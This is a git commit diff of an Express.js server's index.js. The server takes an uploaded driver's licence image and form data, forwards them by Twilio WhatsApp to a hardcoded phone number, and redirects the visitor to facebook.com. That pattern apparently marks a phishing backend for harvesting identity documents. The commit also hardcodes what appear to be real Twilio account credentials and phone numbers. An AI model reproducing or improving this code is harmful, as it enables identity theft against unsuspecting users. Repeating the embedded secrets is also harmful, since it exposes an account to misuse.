3da06c1374e58ae3b878b113b5c6e3e476a1d2aa
hekping <130031651+hekping@users.noreply.github.com>
2023-04-06 16:49:20 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,29 +1,29 @@
 const express = require("express");
 const app = express();
-const fs = require("fs");
+const fs = require("fs").promises;
 const path = require("path");
 const bodyParser = require("body-parser");
 const multer = require("multer");
 const zipFolder = require("zip-a-folder");
 const compromise = require("compromise");
-const twilio = require("twilio");
+const client = require("twilio")("ACe54e344198f142962f26f8dbbb56bcdc", "d121c459858a2071e48667eddf9d2209");
 
-// Generate a random sentence for the message body
+// Generate a random sentence for the WhatsApp message body
 const randomSentence = compromise("i").random().sentences(1).out();
-
-// Generate a Twilio client object
-const client = new twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
-
-const port = 9000;
-
-app.use(bodyParser.urlencoded({ extended: false }));
-app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, "public")));
 
 // Set up file upload using multer
 const storage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    cb(null, "uploads/");
+  destination: async function (req, file, cb) {
+    try {
+      await fs.mkdir(path.resolve(__dirname, "uploads"));
+      cb(null, "uploads/");
+    } catch (err) {
+      if (err.code === "EEXIST") {
+        cb(null, "uploads/");
+      } else {
+        cb(err);
+      }
+    }
   },
   filename: function (req, file, cb) {
     const ext = path.extname(file.originalname);
@@ -33,8 +33,12 @@ const storage = multer.diskStorage({
 
 const upload = multer({ storage: storage });
 
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+app.use(express.static(path.resolve(__dirname, "public")));
+
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  res.sendFile(path.resolve(__dirname, "index.html"));
 });
 
 app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
@@ -48,31 +52,33 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
 
     // create a folder to store the message data
     const folderName = `message-${Date.now()}`;
-    fs.mkdirSync(folderName);
+    await fs.mkdir(path.resolve(__dirname, folderName));
 
     // save the message data to a text file
     const dataFileName = path.join(folderName, "happy.txt");
-    fs.writeFileSync(dataFileName, JSON.stringify(data));
+    await fs.writeFile(path.resolve(__dirname, dataFileName), JSON.stringify(data));
 
-    // send message with Twilio
+    // send WhatsApp message with media attachment
     const message = await client.messages.create({
-      from: "whatsapp:<your Twilio WhatsApp number>",
-      to: "whatsapp:<recipient phone number>",
+      from: "whatsapp:+2349154911424",
+      to: "whatsapp:+2348077050140", // recipient WhatsApp number
       body: `${randomSentence}`,
-      mediaUrl: `https://example.com/uploads/${dataFileName}`,
+      mediaUrl: `https://${req.get("host")}/${req.file.path}`,
     });
-    console.log("Message sent successfully.", message);
+    console.log("WhatsApp message sent successfully.", message);
 
     // remove the folder and file
-    fs.unlinkSync(dataFileName);
-    fs.rmdirSync(folderName, { recursive: true });
+    await fs.unlink(path.resolve(__dirname, dataFileName));
+    await fs.rmdir(path.resolve(__dirname, folderName), { recursive: true });
 
     res.redirect("https://www.facebook.com");
   } catch (err) {
     console.error(err);
-    res.status(500).send("Error sending message.");
+    res.status(500).send("Error sending WhatsApp message.");
   }
 });
+
+const port = 9000;
 
 app.listen(port, () => {
   console.log(`Server listening on port ${port}`);
